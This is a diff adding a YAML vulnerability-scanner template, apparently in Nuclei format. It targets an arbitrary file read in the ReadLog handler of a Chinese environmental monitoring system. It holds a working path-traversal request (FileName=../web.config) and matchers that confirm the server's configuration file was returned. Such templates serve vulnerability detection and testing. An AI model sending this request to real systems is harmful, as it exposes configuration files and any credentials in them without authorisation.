@@ -1,0 +1,24 @@
+id: 3ctech-readlog-anyfile-read
+info:
+  name: 3C环境自动监测监控系统 ReadLog 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ajax/sys/LogService.ashx?Method=ReadLog&FileName=../web.config"
+    headers:
+      X-Requested-With: XMLHttpRequest
+      Referer: "{{BaseURL}}/Sys/Log/FileLogList.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<configuration>"
+          - "system.web.extensions"
+          - "PublicKeyToken="
+        part: body
